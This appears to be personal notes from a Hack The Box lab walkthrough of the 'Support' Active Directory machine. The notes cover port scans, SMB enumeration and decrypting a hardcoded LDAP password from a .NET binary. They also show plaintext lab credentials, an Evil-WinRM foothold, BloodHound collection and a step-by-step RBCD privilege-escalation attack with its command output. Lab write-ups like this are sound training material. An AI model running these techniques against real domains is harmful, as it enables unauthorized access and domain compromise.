- ping machine
	- `ping ###.###.###.###`
```bash


```
- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	- or ''
```bash
kali@kali  ~/htb  nmap -p- -T4 --open -Pn -vvv 10.10.11.174 -oN supportNmap.t
xt                                                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 14:28 EDT                 
Initiating Parallel DNS resolution of 1 host. at 14:28                          
Completed Parallel DNS resolution of 1 host. at 14:28, 0.15s elapsed            
DNS resolution of 1 IPs took 0.15s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 
0, TR: 1, CN: 0]                                                                
Initiating SYN Stealth Scan at 14:28                                            
Scanning 10.10.11.174 [65535 ports]                                             
Discovered open port 53/tcp on 10.10.11.174                                     
Discovered open port 135/tcp on 10.10.11.174                                    
Discovered open port 445/tcp on 10.10.11.174                                    
Discovered open port 139/tcp on 10.10.11.174                                    
Discovered open port 88/tcp on 10.10.11.174                                     
SYN Stealth Scan Timing: About 13.87% done; ETC: 14:32 (0:03:12 remaining)      
Discovered open port 49674/tcp on 10.10.11.174                                  
Discovered open port 49678/tcp on 10.10.11.174                                  
Discovered open port 9389/tcp on 10.10.11.174                                   
SYN Stealth Scan Timing: About 48.83% done; ETC: 14:30 (0:01:04 remaining)      
Discovered open port 5985/tcp on 10.10.11.174                                   
Discovered open port 636/tcp on 10.10.11.174                                    
Discovered open port 49699/tcp on 10.10.11.174                                  
Discovered open port 464/tcp on 10.10.11.174                                    
Discovered open port 49664/tcp on 10.10.11.174                                  
Discovered open port 49668/tcp on 10.10.11.174                                  
Discovered open port 593/tcp on 10.10.11.174                                    
Discovered open port 3269/tcp on 10.10.11.174                                   
Discovered open port 49733/tcp on 10.10.11.174                                  
Discovered open port 389/tcp on 10.10.11.174                                    
Discovered open port 3268/tcp on 10.10.11.174                                   
Completed SYN Stealth Scan at 14:30, 94.89s elapsed (65535 total ports)         
Nmap scan report for 10.10.11.174                                               
Host is up, received user-set (0.056s latency).                                 
Scanned at 2025-04-13 14:28:45 EDT for 95s                                      
Not shown: 65516 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49733/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 95.12 seconds
           Raw packets sent: 131113 (5.769MB) | Rcvd: 81 (3.564KB)
```

- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap` 
```bash
 kali@kali  ~/htb  nmap -p 53,88,135,139,445,464,593,636,3268,3269,5985,9389,4
9664,49668,49674,49678, 49699,49733 -sC -sV 10.10.11.174 -oN supportServicesVers
ionsNmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 14:39 EDT
Failed to resolve "49699,49733".
Nmap scan report for 10.10.11.174
Host is up (0.14s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 18:39:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T18:40:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.20 seconds

```
- noticing that the box appears to be running dns, kerberos, ldap we enumerate the DNS servers to confirm the servers name. 
```bash
 ✘ kali@kali  ~/htb/support  dig @10.10.11.174 +short support.htb any
10.10.11.174
dc.support.htb.
dc.support.htb. hostmaster.support.htb. 107 900 600 86400 3600
```


- smb found running on port 139, 445
- using smbclient to enumerate list shares `-L` 
```bash
 ✘ kali@kali  ~/htb  smbclient -L 10.10.11.174
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- tried to log on to each share - only NETLOGON, support-tools, SYSVOL available 
	- only support-tools available to log into 
	- pulling down all the files reveals there is a folder and files UserInfo.zip
		- Within UserInfo.zip there is a UserInfo.exe, UserInfo.exe.config
		- viewing the UserInfo.exe.config we note that it is running on .NETFramework,Version=v4.8
```bash
 kali@kali  ~/htb/support  cat UserInfo.exe.config 
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b0
3f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding> 
  </runtime>
</configuration>%     

```
- running the executable - the file appears to be a way to query an ldap database for credentials
```bash
 kali@kali  ~/htb/support  ./UserInfo.exe 

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user                      

 kali@kali  ~/htb/support  ./UserInfo.exe -v find -first YourMom
[*] LDAP query to use: (givenName=YourMom)
[-] Exception: No Such Object

```
- We can decompile the file to understand how it works with AvaloniaILSpy
	- https://github.com/icsharpcode/AvaloniaILSpy?tab=readme-ov-file
	- `Protected` class has an encoded password, username and getPassword()
	![[Pasted image 20250503125655.png]]
```bash
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```
- using https://dotnetfiddle.net/ to run the code to decode the password
	- ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
![[Pasted image 20250503131347.png]]
```bash
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}					
public class Program
{
	public static void Main()
	{
		Console.WriteLine(Protected.getPassword());
	}
	
	
}
```

- Now that we have credentials we should use them to run enum4linux to enumerate the box further.
```bash
 =======================================( Users on 10.10.11.174 )=======================================                                            
index: 0xeda RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain        
index: 0xf70 RID: 0x455 acb: 0x00000210 Account: anderson.damian        Name: (null)    Desc: (null)                                                
index: 0xfbb RID: 0x459 acb: 0x00000210 Account: bardot.mary    Name: (null)    Desc: (null)                                                        
index: 0xfbc RID: 0x45a acb: 0x00000210 Account: cromwell.gerard        Name: (null)    Desc: (null)                                                
index: 0xfc0 RID: 0x45e acb: 0x00000210 Account: daughtler.mabel        Name: (null)    Desc: (null)                                                
index: 0xfc2 RID: 0x460 acb: 0x00000210 Account: ford.victoria  Name: (null)    Desc: (null)                                                        
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain              
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: hernandez.stanley      Name: (null)    Desc: (null)                                                
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account                               
index: 0xfbf RID: 0x45d acb: 0x00000210 Account: langley.lucy   Name: (null)    Desc: (null)                                                        
index: 0xf6b RID: 0x450 acb: 0x00000210 Account: ldap   Name: (null)    Desc: (null)                                                                
index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: levine.leopoldo        Name: (null)    Desc: (null)                                                
index: 0xfbd RID: 0x45b acb: 0x00000210 Account: monroe.david   Name: (null)    Desc: (null)                                                        
index: 0xfba RID: 0x458 acb: 0x00000210 Account: raven.clifton  Name: (null)    Desc: (null)                                                        
index: 0xf6d RID: 0x452 acb: 0x00000210 Account: smith.rosario  Name: (null)    Desc: (null)                                                        
index: 0xfc1 RID: 0x45f acb: 0x00000210 Account: stoll.rachelle Name: (null)    Desc: (null)                                                        
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: support        Name: (null)    Desc: (null)                                                        
index: 0xf71 RID: 0x456 acb: 0x00000210 Account: thomas.raphael Name: (null)    Desc: (null)                                                        
index: 0xfbe RID: 0x45c acb: 0x00000210 Account: west.laura     Name: (null)    Desc: (null)                                                        
index: 0xf6f RID: 0x454 acb: 0x00000210 Account: wilson.shelby  Name: (null)    Desc: (null)  

user:[Administrator] rid:[0x1f4]                                                                                                                    
user:[Guest] rid:[0x1f5]                                                                                                                            
user:[krbtgt] rid:[0x1f6]                                                                                                                           
user:[ldap] rid:[0x450]                                                                                                                             
user:[support] rid:[0x451]                                                                                                                          
user:[smith.rosario] rid:[0x452]                                                                                                                    
user:[hernandez.stanley] rid:[0x453]                                      
user:[wilson.shelby] rid:[0x454]                                          
user:[anderson.damian] rid:[0x455]                                        
user:[thomas.raphael] rid:[0x456]                                         
user:[levine.leopoldo] rid:[0x457]                                        
user:[raven.clifton] rid:[0x458]                                          
user:[bardot.mary] rid:[0x459]                                            
user:[cromwell.gerard] rid:[0x45a]                                        
user:[monroe.david] rid:[0x45b]                                           
user:[west.laura] rid:[0x45c]                                             
user:[langley.lucy] rid:[0x45d]                                           
user:[daughtler.mabel] rid:[0x45e]                                        
user:[stoll.rachelle] rid:[0x45f]                                         
user:[ford.victoria] rid:[0x460]              
```
- Further enumeration of the users reveals password in support user info
	- `ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(sAMAccountName=support)"`
	- info: Ironside47pleasure40Watchful
```bash
 kali@kali  ~/htb/support  ldapsearch -x -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=h
tb" "(sAMAccountName=support)"                                                                                                                      
# extended LDIF                                                                                                                                     
#                                                                                                                                                   
# LDAPv3                                                                                                                                            
# base <dc=support,dc=htb> with scope subtree                                                                                                       
# filter: (sAMAccountName=support)                                                                                                                  
# requesting: ALL                                                                                                                                   
#                                                                                                                                                   
# support, Users, support.htb                                                                                                                       
dn: CN=support,CN=Users,DC=support,DC=htb                                                                                                           
objectClass: top                                                                                                                                    
objectClass: person                                                                                                                                 
objectClass: organizationalPerson                                                                                                                   
objectClass: user                                                                                                                                   
cn: support                                                                                                                                         
c: US                                                                                                                                               
l: Chapel Hill                                                                                                                                      
st: NC                                                                                                                                              
postalCode: 27514                                                                                                                                   
distinguishedName: CN=support,CN=Users,DC=support,DC=htb                                                                                            
instanceType: 4                                                                                                                                     
whenCreated: 20220528111200.0Z                                                                                                                      
whenChanged: 20250503030142.0Z                                                                                                                      
uSNCreated: 12617                                                                                                                                   
info: Ironside47pleasure40Watchful  
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 86115
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133907149028701269

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

- now that we have credentials to support we can use Evil-WinRM to logon to the box
	- support:Ironside47pleasure40Watchful
```bash
 ✘ kali@kali  ~/htb/support  evil-winrm -i 10.10.11.174 -u support
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> 
```
- navigating to support's Desktop we find the user flag
```bash
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
814e218..........................
```

- Run Get-ADDomain for additional information about the domain
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb
```
- download Sharphound on kali and upload to target machine and run
```bash 
*Evil-WinRM* PS C?\Users\support\Documents> upload Sharphound.exe

Info: Uploading /home/kali/tools/bloodhound/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe   

Data: 1712808 bytes of 1712808 bytes copied                                                           
Info: Upload successful!                                                                                  
*Evil-WinRM* PS C:\Users\support\Documents> dir                                                       
    Directory: C:\Users\support\Documents                                                              Mode                 LastWriteTime         Length Name                                                ----                 -------------         ------ ----                                               
-a----          5/7/2025   4:45 AM        1284608 SharpHound.exe

*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe                                              
2025-05-07T04:46:04.4794353-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Rele
ase of BloodHound
2025-05-07T04:46:04.6356912-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Tru
sts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientSe
rvice, SmbInfo            
2025-05-07T04:46:04.6825754-07:00|INFORMATION|Initializing SharpHound at 4:46 AM on 5/7/2025
2025-05-07T04:46:04.7138027-07:00|INFORMATION|Resolved current domain to support.htb
2025-05-07T04:46:04.8544396-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, R
DP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
...
2025-05-07T04:46:06.0731848-07:00|INFORMATION|Saving cache with stats: 16 ID to type mappings.
 0 name to SID mappings.                             
 1 machine sid mappings.                             
 3 sid to domain mappings.                           
 0 global catalog mappings.                          
2025-05-07T04:46:06.1045080-07:00|INFORMATION|SharpHound Enumeration Completed at 4:46 AM on 5/7/2025! Hap
py Graphing!

```
- download the zip file that was generated 
```bash
*Evil-WinRM* PS C:\Users\support\Documents> download 20250507044605_BloodHound.zip
Info: Downloading C:\Users\support\Documents\20250507044605_BloodHound.zip to 20250507044605_BloodHound.zip
Info: Download successful! 
```
- upload to Bloodhound under Administration menu
![[Pasted image 20250517114233.png]]
- Explore and search for support@support.htb, select and expand Object Information, expand Outbound Object control.
	- We see the path from Support to Shared Support Accounts to DC.support.htb
![[Pasted image 20250517114658.png]]
- Clicking on 'GenericAll' allows us to look at the Windows abuse info that Bloodhound mentions that due to GenerciAll privilege we can perform a 'Resource Based Constrained Delegation' (RBCD) attack and escalate our privileges. 
![[Pasted image 20250517120035.png]]
- Download Powerview on kali and upload to target machine and import https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```bash
*Evil-WinRM* PS C?\Users\support\Documents> upload PowerView.ps1
*Evil-WinRM* PS C?\Users\support\Documents> . ./PowerView.pst
```
- Run Get-DomainComputer DC to verify `msds-allowedtoactonbehalfoftotheridentiity` is empty
	- With the msds value empty, it is susceptible to RBCD attack using Powermad
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity                                                                                           
name msds-allowedtoactonbehalfofotheridentity                                                             
---- ----------------------------------------                                                             
DC        
```
- Download Powermad on kali and upload to target machine and import https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1#L303
```bash
*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1                                           
Info: Uploading /home/kali/htb/support/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1            
Data: 180768 bytes of 180768 bytes copied                                                                 
Info: Upload successful!                                                                                  
*Evil-WinRM* PS C:\Users\support\Documents> . ./Powermad.ps1

```
- Create a computer object - creates a fake computer and add it to the domain using PowerMad's `New-MachineAccount` module
```bash
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)                                                    
[+] Machine account FAKE-COMP01 added                                                                     
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -identity FAKE-COMP01                          
DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb                                         
DNSHostName       : FAKE-COMP01.support.htb                                                               
Enabled           : True                                                                                  
Name              : FAKE-COMP01                                                                           
ObjectClass       : computer                                                                              
ObjectGUID        : d2217ca1-27f8-4eea-8c82-7e86f058c58c                                                  
SamAccountName    : FAKE-COMP01$                                                                          
SID               : S-1-5-21-1677581083-3380853377-188903654-5601                                         
UserPrincipalName :            
```
- Configuring RBCD using powerView module to directly set the `msds-allowedtoactonbehalfofotheridentity` attribute
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$                                                                                          
*Evil-WinRM* PS C:\Users\support\Documents>
```
- Confirm the command worked by using the Get-ADComputer commad
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount                                                                                            
DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb                      
DNSHostName                          : dc.support.htb                                                     
Enabled                              : True                                                               
Name                                 : DC                                                                 
ObjectClass                          : computer                                                           
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127                               
PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}                    
SamAccountName                       : DC$                                                                
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000                      
UserPrincipalName                    :                  
```
- Verify the value of `msds`
```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select msds-allowedtoactonbehalfofothe
ridentity                                                                                                 
msds-allowedtoactonbehalfofotheridentity                                                                  
----------------------------------------                                                                  
{1, 0, 4, 128...}     
```
- As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on.
	- First, let's grab the desired value and dump it to a variable called RawBytes 
```bash
*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allo
wedtoactonbehalfofotheridentity        
```
- Then convert these bytes to a Raw Security Descriptor object
```bash
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0      
``` 
- Print both the entire security `Descriptor` and the `DiscretionaryAcl` class which represents the Access Control LIst that specifies the machines that can act on behalf of the DC
```bash
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor                                                               
 
ControlFlags           : DiscretionaryAclPresent, SelfRelative                                            
Owner                  : S-1-5-32-544                                          
Group                  :                                                                                  
SystemAcl              :                                                                                              DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}                                        
ResourceManagerControl : 0                                                                                
BinaryLength           : 80                                                                               

*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl                                              
AceQualifier       : AccessAllowed                                                                        
IsCallback         : False                                                                                            
OpaqueLength       : 0                                                
AccessMask         : 983551                                                                               
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601                                                    
AceType            : AccessAllowed                                                                                    
AceFlags           : None                                                                                             
IsInherited        : False                                                                                            InheritanceFlags   : None                                                                                             
PropagationFlags   : None                                                                                 
AuditFlags         : None        
```




- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
```bash

```
- -or-
- ffuf to enumerate website if machine has 80 or 443
	- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ -e .php,.txt -t 10
	- ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.10/FUZZ
	- wordlist 3 millipon
```bash

```

- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document

- Foothold - Look around and check things out for a second
	- search local directory
	- search root directory
	- sudo -l
	- look for exploitable binary's
		- `$ find / -perm /4000 2>/dev/null'
		- 

